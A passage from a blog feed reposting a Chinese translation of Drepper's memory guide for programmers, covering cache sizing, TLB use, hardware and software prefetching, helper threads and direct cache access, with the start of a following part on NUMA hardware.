缓存和更高的缓存通常由多个核心和&#x2F;或超线程共享。因此，每个执行单元可用的有效缓存大小通常小于总缓存大小。</li></ul><p>为了避免高昂的缓存未命中成本，工作集大小应该与缓存大小相匹配。如果数据只需要一次，这显然没有必要，因为缓存无论如何都是无效的。我们谈论的是数据集需要多次的工作负载。在这种情况下，使用一个太大而不适合放入缓存的工作集将创建大量的缓存未命中，即使预取成功执行，也会减慢程序速度。</p><p>程序必须执行其工作，即使数据集太大。这是程序员的工作，以最小化缓存未命中的方式完成工作。对于最后一级缓存，这是可能的——就像对 L1 缓存一样——通过在更小的部分上处理工作。这非常类似于表 6.2 中优化的矩阵乘法。一个区别是，对于最后一级缓存，要处理的数据块可以更大。如果 L1 优化也需要，代码变得更加复杂。想象一下矩阵乘法，其中数据集——两个输入矩阵和输出矩阵——不适合最后一级缓存一起。在这种情况下，可能适当的同时优化 L1 和最后一级缓存访问。</p><p>L1 缓存行大小在许多处理器代中通常是恒定的；即使不是，差异也将很小。假设更大的大小没有问题。在处理器上具有较小缓存大小的情况下，将使用两个或更多缓存行而不是一个。在任何情况下，为它硬编码缓存行大小并优化代码是合理的。</p><p>对于更高级别的缓存，如果程序应该是通用的，这不是这样。这些缓存的大小可以有很大的差异。八倍或更多的因素并不罕见。不可能将更大的缓存大小作为默认值，因为这将意味着代码在所有机器上的性能都很差，除了那些拥有最大缓存的机器。相反的选择也不好：假设最小的缓存意味着扔掉 87% 或更多的缓存。这是不好的；正如我们从图 3.14 看到的，使用大缓存可以对程序的速度产生巨大影响。</p><p>这意味着代码必须根据缓存行大小动态调整自己。这是特定于程序的优化。我们在这里只能说，程序员应该正确计算程序的要求。不仅需要数据集本身，更高级别的缓存也用于其他目的；例如，所有执行的指令都从缓存中加载。如果使用库函数，这种缓存使用可能会增加相当大的数量。这些库函数也可能需要它们自己的数据，进一步减少了可用的内存。</p><p>一旦我们有了内存需求的公式，我们就可以将其与缓存大小进行比较。如前所述，缓存可能与多个其他核心共享。目前 {肯定很快就会有更好的方法！} 获取正确信息的唯一方法，而不是硬编码知识，是通过 <code>/sys</code> 文件系统。在表 5.2 中，我们已经看到了内核对硬件发布的信息。程序必须找到目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/sys/devices/system/cpu/cpu*/cache<br></code></pre></td></tr></table></figure><p>对于最后一级缓存。这可以通过该目录中 <code>level</code> 文件中最高的数值来识别。当目录被识别时，程序应该读取该目录中 <code>size</code> 文件的内容，并将数值除以文件 <code>shared_cpu_map</code> 中位掩码中设置的位数。</p><p>这样计算出的值是一个安全的下限。有时程序对其他线程或进程的行为了解更多。如果这些线程被安排在共享缓存的核心或超线程上，并且已知缓存使用不会耗尽其总缓存大小的一部分，则计算出的极限可能太低而无法最优。是否应该使用超过公平份额的缓存真的取决于情况。程序员必须做出选择，或者必须允许用户做出决定。</p><h4 id="6-2-4-优化-TLB-使用"><a href="#6-2-4-优化-TLB-使用" class="headerlink" title="6.2.4 优化 TLB 使用"></a>6.2.4 优化 TLB 使用</h4><p>TLB 使用的优化有两种。第一种优化是减少程序必须使用的页面数量。这自然会导致更少的 TLB 未命中。第二种优化是通过减少必须分配的更高级别目录表的数量，使 TLB 查找更便宜。更少的表意味着更少的内存使用，这可能导致目录查找的缓存命中率更高。</p><p>第一种优化与最小化页面错误密切相关。我们将在第 7.5 节中详细涵盖该主题。虽然页面错误通常是一次性成本，但 TLB 未命中是持续的惩罚，因为 TLB 缓存通常很小，并且经常刷新。页面错误比 TLB 未命中昂贵得多，但是，如果程序运行时间足够长，并且某些程序部分频繁执行，TLB 未命中甚至可能超过页面错误成本。因此，重要的是从页面错误和 TLB 未命中的角度考虑页面优化。不同之处在于，虽然页面错误优化只需要将代码和数据分组到一页宽，但 TLB 优化要求在任何时候尽可能少地使用 TLB 条目。</p><p>第二种 TLB 优化更难控制。必须使用的页面目录的数量取决于进程的虚拟地址空间中使用的地址范围的分布。在地址空间中广泛变化的位置意味着更多的目录。一个复杂的问题是，地址空间布局随机化（ASLR）导致正是这些情况。为了防止机器的攻击者猜测函数或变量的地址，堆栈、DSO、堆和可能的可执行文件的加载地址在运行时随机化。</p><p>为了获得最大性能，ASLR 肯定应该被关闭。额外目录的成本足够低，以至于在几乎所有情况下都不需要这样做。内核可以随时执行的一种优化是确保单个映射不会跨越两个目录之间的地址空间边界。这将以最小的方式限制 ASLR，但不足以显著削弱它。</p><p>程序员直接受此影响的唯一方式是当显式请求地址空间区域时。这发生在使用 <code>mmap</code> 与 <code>MAP_FIXED</code> 时。以这种方式分配新的地址空间区域非常危险，几乎从不这样做。然而，这是可能的，如果使用它，程序员应该知道最后一级页面目录的边界，并适当选择请求的地址。</p><h3 id="6-3-预取"><a href="#6-3-预取" class="headerlink" title="6.3 预取"></a>6.3 预取</h3><p>预取的目的是隐藏内存访问的延迟。今天处理器的命令流水线和乱序执行（OOO）能力可以隐藏一些延迟，但充其量只能对缓存命中的访问隐藏延迟。要覆盖主内存访问的延迟，命令队列必须非常长。一些没有 OOO 的处理器试图通过增加核心数量来补偿，但这是一种糟糕的权衡，除非所有使用的代码都被并行化了。</p><p>预取可以进一步帮助隐藏延迟。处理器根据某些事件（硬件预取）或程序（软件预取）的显式请求执行预取。</p><h4 id="6-3-1-硬件预取"><a href="#6-3-1-硬件预取" class="headerlink" title="6.3.1 硬件预取"></a>6.3.1 硬件预取</h4><p>硬件预取的触发器通常是两个或更多缓存未命中的特定模式。这些缓存未命中可以是对连续或前面的缓存行。在旧的实现中，只有对相邻缓存行的缓存未命中才被识别。在现代硬件中，步幅也被识别，这意味着跳过固定数量的缓存行被识别为一种模式，并得到适当的处理。</p><p>如果每个单独的缓存未命中都触发硬件预取，对性能来说是很糟糕的。例如，对全局变量的随机内存访问非常普遍，由此产生的预取大多会浪费 FSB 带宽。这就是为什么，要启动预取，至少需要两个缓存未命中。处理器今天都期望有超过一个的内存访问流。处理器尝试自动为每个缓存未命中分配这样的流，如果达到阈值，则开始硬件预取。当今的 CPU 可以跟踪八到十六个独立的流，用于更高级别的缓存。</p><p>负责模式识别的单元与相应的缓存相关联。可能有 L1d 和 L1i 缓存的预取单元。对于 L2 缓存和更高级别的缓存，很可能也有预取单元。L2 和更高级别的预取单元与使用相同缓存的所有其他核心和超线程共享。因此，八到十六个独立流的数量很快就会减少。</p><p>预取有一个大弱点：它不能跨越页面边界。原因应该是显而易见的，当一个人意识到 CPU 支持按需分页时。如果预取器被允许跨越页面边界，访问可能会触发操作系统事件以使页面可用。这本身就可能是糟糕的，特别是对于性能。更糟糕的是，预取器不了解程序或操作系统本身的语义。它因此可能会预取页面，这些页面在现实生活中永远不会被请求。这意味着预取器可能会在处理器以可识别的模式访问的内存区域之前，运行得更远。这不仅是可能的，而且是非常可能的。如果处理器作为预取的副作用触发了对这样一页的请求，操作系统甚至可能完全偏离其轨道，因为这样的请求在其他情况下永远不会发生。</p><p>因此，重要的是要意识到，无论预取器在预测模式方面有多好，程序将在页面边界处经历缓存未命中，除非它显式地预取或从新页面读取。这是另一个原因，要优化数据的布局，以最小化缓存污染，通过保持不相关数据的分离。</p><p>由于这个页面限制，处理器没有非常复杂的逻辑来识别预取模式。考虑到仍然普遍的 4k 页面大小，有意义的范围有限。在其中识别步幅的地址范围多年来已经增加，但今天超过通常使用的 512 字节窗口可能没有太多意义。当前的预取单元不识别非线性访问模式。更有可能的是，这样的模式确实是随机的，或者至少是足够非重复的，以至于尝试识别它们是没有意义的。</p><p>如果硬件预取意外被触发，可以做的事情只有那么多。一种可能性是尝试检测这个问题并稍微更改数据和&#x2F;或代码布局。这可能会很困难。可能有一些特殊的本地解决方案，比如在 x86 和 x86-64 处理器上使用 <code>ud2</code> 指令 { _或非指令。这是推荐的未定义操作码。} 这个指令本身不能执行，它在间接跳转指令后使用；它用作指令获取器的信号，处理器不应该浪费努力解码以下内存，因为执行将在不同位置继续。这是一个非常特殊的情况。在大多数情况下，我们不得不接受这个问题。</p><p>可以完全或部分禁用整个处理器的硬件预取。在 Intel 处理器上，使用模型特定寄存器（MSR）进行此操作（IA32_MISC_ENABLE，许多处理器上的位 9；位 19 仅禁用相邻缓存行预取）。这在大多数情况下必须在内核中发生，因为它是一个特权操作。如果分析显示在系统上运行的重要应用程序由于硬件预取而遭受带宽耗尽和过早缓存逐出，使用这个 MSR 是可能的。</p><h4 id="6-3-2-软件预取"><a href="#6-3-2-软件预取" class="headerlink" title="6.3.2 软件预取"></a>6.3.2 软件预取</h4><p>硬件预取的优势在于程序不需要调整。缺点，正如刚刚描述的那样，是访问模式必须是平凡的，预取不能在页面边界之外发生。由于这些原因，我们现在有更多的可能性，其中软件预取是最重要的。软件预取确实需要修改源代码，通过插入特殊指令。一些编译器支持 pragma 来或多或少地自动插入这些特殊指令。</p><p>在 x86 和 x86-64 上，Intel 的编译器内建函数约定通常用于插入这些特殊指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;xmmintrin.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">mm_hint</span> &#123;</span><br>   _MM_HINT_T0 = <span class="hljs-number">3</span>,<br>   _MM_HINT_T1 = <span class="hljs-number">2</span>,<br>   _MM_HINT_T2 = <span class="hljs-number">1</span>,<br>   _MM_HINT_NTA = <span class="hljs-number">0</span><br>&#125;;<br><span class="hljs-type">void</span> _mm_prefetch(<span class="hljs-type">void</span> *p,<br>                  <span class="hljs-keyword">enum</span> _mm_hint h);<br></code></pre></td></tr></table></figure><p>程序可以使用 <code>_mm_prefetch</code> 内建函数对程序中的任何指针进行操作。大多数处理器（包括所有 x86 和 x86-64 处理器）会忽略由于无效指针导致的错误，这使得程序员的生活大大简化。如果传递的指针引用了有效的内存，那么预取单元将被指令加载数据到缓存中，并在必要时逐出其他数据。不必要的预取应该绝对避免，因为这可能会降低缓存的有效性，并消耗内存带宽（可能在逐出的缓存行是脏的情况下是两个缓存行）。</p><p>与 <code>_mm_prefetch</code> 内建函数一起使用的不同的提示是实现定义的。这意味着每个处理器版本都可以略有不同地实现它们。通常可以说的是 <code>_MM_HINT_T0</code> 将数据获取到所有级别的缓存中，对于包容性缓存，以及对于排他性缓存到最低级别的缓存。如果数据项在更高级别的缓存中，它将被加载到 L1d 中。<code>_MM_HINT_T1</code> 提示将数据拉入 L2 而不是 L1d。如果有 L3 缓存，<code>_MM_HINT_T2</code> 提示可以对它做类似的事情。这些是细节，虽然弱指定，需要为实际使用的处理器进行验证。一般来说，如果数据将立即使用，使用 <code>_MM_HINT_T0</code> 是正确的选择。当然，这需要 L1d 缓存大小足以容纳所有预取的数据。如果立即使用的工作集大小太大，将所有内容预取到 L1d 是一个坏主意，应该使用其他两个提示。</p><p>第四个提示 <code>_MM_HINT_NTA</code> 是特殊的，因为它允许告诉处理器特别对待预取的缓存行。NTA 代表非临时对齐，我们在第 6.1 节中已经解释过了。程序告诉处理器应尽可能避免使用此数据污染缓存，因为数据只短时间使用。因此，处理器在加载时可以避免将数据读入较低级别的缓存，对于包容性缓存实现。当数据从 L1d 逐出时，数据不需要推入 L2 或更高，而是可以直接写入内存。处理器设计者可能部署其他技巧，如果给出了这个提示。程序员在使用这个提示时必须小心：如果即时工作集大小太大并强制逐出带有 NTA 提示加载的缓存行，将从内存重新加载。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291927153.png"></p><blockquote><p><strong>图 6.7：平均值与预取，NPAD&#x3D;31</strong></p></blockquote><p>图 6.7 显示了使用现在熟悉的指针追逐框架的测试结果。列表是随机的。与以前的测试不同的是，程序实际上在每个列表节点上花费了一些时间（大约 160 个周期）。正如我们从图 3.15 中的数据中学到的，一旦工作集大小大于最后一级缓存，程序的性能就会严重受损。</p><p>我们现在可以通过在计算之前发出预取请求来尝试改善这种情况。也就是说，在循环的每一轮中，我们预取一个新的元素。预取的节点在列表中与当前正在处理的节点之间的距离必须仔细选择。鉴于每个节点在 160 个周期内被处理，并且我们必须预取两个缓存行（<code>NPAD</code> &#x3D;31），五个列表元素的距离就足够了。</p><p>图 6.7 的结果表明，预取确实有帮助。只要工作集大小不超过最后一级缓存的大小（机器有 512kB &#x3D; 2^19B 的 L2），数字就是相同的。预取指令没有增加可测量的额外负担。一旦超过 L2 大小，预取节省了 50 到 60 个周期，高达 8%。预取不能隐藏所有的惩罚，但它确实有所帮助。</p><p>AMD 在其 Opteron 系列的 10h 家族中实现了另一个指令：<code>prefetchw</code>。这个指令到目前为止在 Intel 方面没有等效的指令，也不通过内建函数提供。<code>prefetchw</code> 指令像其他预取指令一样将缓存行预取到 L1，但不同之处在于缓存行立即被置于 ‘M’ 状态。如果后面没有写入到缓存行，这将是一个劣势。如果有一到多个写入，它们将被加速，因为写入不需要改变缓存状态——在缓存行被预取时已经发生了。预取可以带来比我们在这里实现的微不足道的 8% 更大的优势。但正确执行预取是出了名的困难，特别是如果同一个二进制文件应该在各种机器上表现良好。</p><p>CPU 提供的性能计数器可以帮助程序员分析预取。可以计数和采样的事件包括硬件预取、软件预取、有用的软件预取、各级缓存未命中等。在第 7.1 节中，我们将介绍这些事件中的一些。所有这些计数器都是特定于机器的。</p><p>在分析程序时，应该首先查看缓存未命中。当找到大量缓存未命中的源头时，应该尝试为有问题的内存访问添加预取指令。这应该一次在一个地方完成。每次修改的结果应该通过观察测量有用预取指令的性能计数器来检查。如果这些计数器没有增加，预取可能是错误的，它没有足够的时间从内存中加载，或者预取逐出了仍然需要的缓存中的内存。</p><p>gcc 现在能够在一种情况下自动发出预取指令。如果循环正在迭代数组，可以使用以下选项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">-fprefetch-loop-arrays<br></code></pre></td></tr></table></figure><p>编译器将弄清楚是否进行预取有意义，如果有意义，应该提前多远。对于小数组，这可能是不利的，如果数组的大小在编译时未知，结果可能更糟。gcc 手册警告说，好处高度依赖于代码的形式，而且在某些情况下，代码实际上可能运行得更慢。程序员必须谨慎使用这个选项。</p><h4 id="6-3-3-预取的特殊类型：推测"><a href="#6-3-3-预取的特殊类型：推测" class="headerlink" title="6.3.3 预取的特殊类型：推测"></a>6.3.3 预取的特殊类型：推测</h4><p>处理器的乱序执行能力允许在不相互冲突的情况下移动指令。例如（这次使用 IA-64 作为示例）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">st8        [r4] = 12<br>add        r5 = r6, r7;;<br>st8        [r18] = r5<br></code></pre></td></tr></table></figure><p>这段代码将值 12 存储在由寄存器 <code>r4</code> 指定的地址，将寄存器 <code>r6</code> 和 <code>r7</code> 的内容相加并存储在寄存器 <code>r5</code> 中。最后，它将总和存储在由寄存器 <code>r18</code> 指定的地址。这里的关键是 <code>add</code> 指令可以在前面的 <code>st8</code> 指令之前或同时执行，因为它们之间没有数据依赖性。但如果其中一个加数需要加载呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">st8        [r4] = 12<br>ld8        r6 = [r8];;<br>add        r5 = r6, r7;;<br>st8        [r18] = r5<br></code></pre></td></tr></table></figure><p>额外的 <code>ld8</code> 指令从由寄存器 <code>r8</code> 指定的地址加载值。显然，这个加载指令和后面的 <code>add</code> 指令之间存在数据依赖性（这就是为什么在指令后面有 <code>;;</code> 的原因，感谢询问）。关键是新的 <code>ld8</code> 指令——与 <code>add</code> 指令不同——不能在前面的 <code>st8</code> 之前移动。处理器在指令解码期间不能足够快地确定存储和加载是否冲突，即 <code>r4</code> 和 <code>r8</code> 是否可能有相同的值。如果它们有相同的值，<code>st8</code> 指令将决定加载到 <code>r6</code> 中的值。更糟糕的是，<code>ld8</code> 也可能由于缓存未命中而带来大量的延迟。</p><p>IA-64 架构支持这种情况的推测性加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ld8.a      r6 = [r8];;<br>[... other instructions ...]<br>st8        [r4] = 12<br>ld8.c.clr  r6 = [r8];;<br>add        r5 = r6, r7;;<br>st8        [r18] = r5<br></code></pre></td></tr></table></figure><p>新的 <code>ld8.a</code> 和 <code>ld8.c.clr</code> 指令属于一起，它们替换了前面代码序列中的 <code>ld8</code> 指令。<code>ld8.a</code> 指令是推测性加载。它的值不能直接使用，但处理器可以开始工作。当到达 <code>ld8.c.clr</code> 指令时，内容可能已经被加载了（给定有足够的指令在间隙中）。这个指令的参数必须与 <code>ld8.a</code> 指令的参数匹配。如果前面的 <code>st8</code> 指令没有覆盖该值（即 <code>r4</code> 和 <code>r8</code> 是相同的），则什么都不需要做。推测性加载完成了它的工作，加载的延迟被隐藏了。如果存储和加载冲突，<code>ld8.c.clr</code> 重新从内存中加载值，我们最终得到了正常 <code>ld8</code> 指令的语义。</p><p>推测性加载还没有（或许？）被广泛使用。但正如示例所示，它是一种非常简单但有效的方法来隐藏延迟。预取基本上是等效的，对于寄存器较少的处理器，推测性加载可能没有太多意义。推测性加载有（有时很大）的优势，它将值直接加载到寄存器中，而不是加载到缓存行中，在那里它可能再次被逐出（例如，当线程被取消调度时）。如果可用，应该使用推测。</p><h4 id="6-3-4-助手线程"><a href="#6-3-4-助手线程" class="headerlink" title="6.3.4 助手线程"></a>6.3.4 助手线程</h4><p>当尝试使用软件预取时，人们经常遇到代码复杂性的问题。如果代码必须迭代数据结构（我们的情况下是列表），则必须在同一个循环中实现两个独立的迭代：正常迭代执行工作和第二个迭代，它向前看，以使用预取。这很容易变得足够复杂，以至于可能会犯错误。</p><p>此外，还需要确定向前看多远。太少，内存将无法及时加载。太远，刚刚加载的数据可能再次被逐出。另一个问题是，尽管预取指令不阻塞并等待内存加载，但它们需要时间。指令必须被解码，如果解码器太忙，这可能是值得注意的，例如，由于编写得很好&#x2F;生成的代码。最后，循环的代码大小增加了。这降低了 L1i 效率。如果尝试通过连续发出多个预取请求（因为第二个加载不依赖于第一个结果）来避免这部分成本，就会遇到未完成的预取请求数量的问题。</p><p>另一种方法是完全独立地执行正常操作和预取。这可以通过两个普通线程完成。显然，必须安排这些线程，以便预取线程正在填充由两个线程访问的缓存。有两种特殊的解决方案值得一提：</p><ul><li><p>使用同一核心上的超线程（见图 3.22）。在这种情况下，预取可以进入 L2（甚至 L1d）。</p></li><li><p>使用比 SMT 线程“更笨”的线程，它们除了预取和其他简单操作外什么也不做。这是处理器制造商可能探索的一个选项。</p></li></ul><p>使用超线程的方法特别有趣。正如我们在图 3.22 中看到的，如果超线程执行独立代码，缓存的共享是一个问题。如果一个线程被用作预取助手线程，这不是问题。相反，这是期望的效果，因为最低级别的缓存被预加载。此外，由于预取线程大部分时间处于空闲或等待内存状态，如果另一个超线程不必访问主内存，它的正常操作就不会受到太多干扰。后者正是预取助手线程防止的。</p><p>唯一的棘手部分是确保助手线程不要运行得太远。它不能完全污染缓存，以至于最旧的预取值再次被逐出。在 Linux 上，可以使用 <code>futex</code> 系统调用来轻松进行同步，或者使用稍微高一些的成本，使用 POSIX 线程同步原语。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291927078.png"></p><blockquote><p><strong>图 6.8：平均值与助手线程，NPAD&#x3D;31</strong></p></blockquote><p>这种方法的好处可以在图 6.8 中看到。这是与图 6.7 相同的测试，只是添加了额外的结果。新测试创建了一个额外的助手线程，该线程提前约 100 个列表项，并读取（不仅仅是预取）每个列表元素的所有缓存行。在这种情况下，我们每个列表元素有两个缓存行（在 32 位机器上，<code>NPAD</code> &#x3D;31，缓存行大小为 64 字节）。</p><p>两个线程被安排在同一个核心的两个超线程上。测试机器只有一个核心，但如果有多个核心，结果应该大致相同。我们将在第 6.4.3 节中介绍的亲缘函数，用于将线程绑定到适当的超线程。<code>NUMA_cpu_level_mask</code> 接口从 libNUMA 可以用来确定操作系统知道是超线程的两个（或更多）处理器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;libNUMA.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">NUMA_cpu_level_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize,</span><br><span class="hljs-params">                             <span class="hljs-type">cpu_set_t</span> *dest,</span><br><span class="hljs-params">                             <span class="hljs-type">size_t</span> srcsize,</span><br><span class="hljs-params">                             <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span>*src,</span><br><span class="hljs-params">                             <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> level)</span>;<br></code></pre></td></tr></table></figure><p>这个接口可以用来确定 CPU 通过缓存和内存连接的层次结构。这里感兴趣的是级别 1，它对应于超线程。要将两个线程安排在两个超线程上，可以使用 libNUMA 函数（错误处理为了简洁起见省略）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">cpu_set_t</span> self;<br>NUMA_cpu_self_current_mask(<span class="hljs-keyword">sizeof</span>(self),<br>                           &amp;self);<br><span class="hljs-type">cpu_set_t</span> hts;<br>NUMA_cpu_level_mask(<span class="hljs-keyword">sizeof</span>(hts), &amp;hts,<br>                    <span class="hljs-keyword">sizeof</span>(self), &amp;self, <span class="hljs-number">1</span>);<br>CPU_XOR(&amp;hts, &amp;hts, &amp;self);<br></code></pre></td></tr></table></figure><p>执行此代码后，我们有两个 CPU 位集。<code>self</code> 可以用来设置当前线程的亲缘性，<code>hts</code> 中的掩码可以用来设置助手线程的亲缘性。这应该在创建线程之前理想地发生。我们将在第 6.4.3 节中介绍设置亲缘性的接口。如果没有超线程可用，<code>NUMA_cpu_level_mask</code> 函数将返回 1。这可以用作避免这种优化的信号。</p><p>这个基准测试的结果可能会令人惊讶（或者也许不会）。如果工作集适合 L2，则助手线程的开销将性能降低 10% 到 60%（再次忽略最小的工作集大小，噪音太高）。这是可以预期的，因为如果所有数据已经在 L2 缓存中，预取助手线程只使用系统资源而没有对执行做出贡献。</p><p>一旦 L2 大小耗尽，情况就改变了。预取助手线程有助于将运行时间减少约 25%。我们仍然看到一个上升的曲线，只是因为预取不能足够快地处理。主线程执行的算术运算和助手线程的内存加载操作相互补充，资源冲突最小，这导致了这种协同效应。</p><p>这些测试的结果应该可以转移到许多其他情况。由于缓存污染，超线程通常不太有用，但在这些情况下它们表现出色，应该被利用。<code>sys</code> 文件系统允许程序找到线程兄弟（见表 5.3 中的 <code>thread_siblings</code> 列）。一旦这些信息可用，程序只需定义线程的亲缘性，然后以两种模式运行循环：正常操作和预取。助手线程预取的内存量应该取决于共享缓存的大小。在这个例子中，L2 的大小是相关的，程序可以使用以下方式查询其大小：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sysconf(_SC_LEVEL2_CACHE_SIZE)<br></code></pre></td></tr></table></figure><p>助手线程的进度是否必须受到限制取决于程序。通常最好确保有一些同步，因为调度细节否则可能导致显着的性能下降。</p><h4 id="6-3-5-直接缓存访问"><a href="#6-3-5-直接缓存访问" class="headerlink" title="6.3.5 直接缓存访问"></a>6.3.5 直接缓存访问</h4><p>现代操作系统中的缓存未命中的一个来源是传入数据流量的处理。现代硬件，如网络接口卡（NIC）和磁盘控制器，具有将接收到的或读取的数据直接写入内存而无需涉及 CPU 的能力。这对于我们今天拥有的设备的性能至关重要，但也带来了问题。假设一个来自网络的传入数据包：操作系统必须通过查看数据包的头部来决定如何处理它。NIC 将数据包放入内存，然后通知处理器数据包的到来。处理器没有机会预取数据，因为它不知道数据何时到达，甚至可能不知道确切的存储位置。结果是在读取头部时发生缓存未命中。</p><p>英特尔在其芯片组和 CPU 中增加了技术来缓解这个问题 [directcacheaccess]。这个想法是用将被通知有关传入数据包的 CPU 的缓存填充数据包的数据。数据包的有效载荷在这里并不重要，这些数据通常由更高级别的函数处理，无论是在内核还是在用户级别。数据包的头部用于决定必须如何处理数据包，因此这些数据立即需要。</p><p>网络 I&#x2F;O 硬件已经有 DMA 来写数据包。这意味着它直接与内存控制器通信，内存控制器可能集成在北桥中。内存控制器的另一侧是通过 FSB 与处理器的接口（假设内存控制器没有集成到 CPU 本身中）。</p><p>直接缓存访问（DCA）的背后思想是扩展 NIC 和内存控制器之间的协议。在图 6.9 中，第一个图显示了在具有南北桥的常规机器中开始 DMA 传输。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291928755.png"><br>图 6.9：直接缓存访问</p><p>NIC 连接到（或是由）南桥。它启动 DMA 访问，但提供了有关应推入处理器缓存的数据包头部的新信息。</p><p>传统行为将是，在第二步中，简单地完成与内存的 DMA 传输。对于设置了 DCA 标志的 DMA 传输，北桥还会向 FSB 发送数据，并带有一个新的特殊 DCA 标志。处理器总是窥探 FSB，如果它识别出 DCA 标志，它就会尝试将定向到处理器的数据加载到最低级别的缓存中。实际上，DCA 标志是一个提示；处理器可以自由地忽略它。DMA 传输完成后，处理器被信号。</p><p>操作系统在处理数据包时，首先必须确定它是什么类型的数据包。如果 DCA 提示没有被忽略，操作系统必须执行的加载很可能击中缓存。将这个节省的数百个周期每个数据包乘以每秒可以处理的数万个数据包，节省的数量加起来就是非常显著的数字，特别是当涉及到延迟时。</p><p>没有集成 I&#x2F;O 硬件（在这个例子中是 NIC）、芯片组和 CPU，这样的优化是不可能的。因此，如果需要这项技术，有必要明智地选择平台。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://lwn.net/Articles/255364/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每个程序员都应该了解的内存知识-Part4</title>
    <link href="/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part4/"/>
    <url>/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part4/</url>
    
    <content type="html"><![CDATA[<p>关于NUMA的支持</p><span id="more"></span><h1 id="5-NUMA-支持"><a href="#5-NUMA-支持" class="headerlink" title="5 NUMA 支持"></a>5 NUMA 支持</h1><p>在第2节中，我们看到，在一些机器上，访问特定物理内存区域的开销因访问来源的不同而不同。这类硬件需要操作系统和应用程序特别小心。我们将从NUMA硬件的一些细节开始，然后我们将介绍Linux内核为NUMA提供的一些支持。</p><h2 id="5-1-NUMA-硬件"><a href="#5-1-NUMA-硬件" class="headerlink" title="5.1 NUMA 硬件"></a>5.1 NUMA 硬件</h2><p>非统一存储体系结构(non-uniform memory architectures)正变得越来越普遍。在最简单的NUMA形式中，处理器访问本地内存（见图2.3）比访问其他处理器的内存的开销更低。</p><p>NUMA还特别适用于大型机器。我们已经描述过了让多个处理器访问同一个内存的问题。对于商业硬件，所有处理器都将共享同一个北桥（暂时忽略AMD Opteron NUMA节点，它们有自己的问题）。这使得北桥成为一个严重的瓶颈，因为所有内存访问都是通过它路由的。当然，大型机器可以使用定制硬件代替北桥，但是，除非使用的内存芯片有多个端口，即它们可以从多个总线使用，否则仍然存在瓶颈。多端口RAM的构建和支持既复杂又昂贵，因此几乎从未使用过。</p><p>复杂性的下一步是AMD使用的模型，其中互连机制为未直接连接到RAM的处理器提供访问。除非想要任意增加直径（即任意两个节点之间的最大距离），否则以这种方式形成的结构的尺寸是有限的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282339956.png"><br>图 5.1: Hypercubes</p><p>一种有效的节点拓扑结构是超立方体，它将节点数量限制在2<sup>C</sup>，其中C是每个节点的互连接口数量。对于所有具有2<sup>n</sup>CPU的系统，超立方体的直径最小。图5.1显示了前三个超立方体。每个超立方体的直径为C，绝对最小值。AMD的第一代Opteron处理器每个处理器有三个超级传输链路。至少有一个处理器必须在一条链路上连接一个南桥，这意味着，目前可以直接高效地实现C&#x3D;2的超立方体。下一代被宣布有四个链接，在这一点上C&#x3D;3超立方体是可能的。</p><p>然而，这并不意味着无法支持更大的处理器堆积。有一些公司已经开发了横杆，允许使用更大的处理器集合（例如，Newisys的Horus）。但这些交叉链接增加了NUMA因子，但是在一定数量以上的处理器上不再高效。</p><p>下一步是连接多组CPU，并为它们实现共享内存。这样的设计存在多层复杂性。IBM 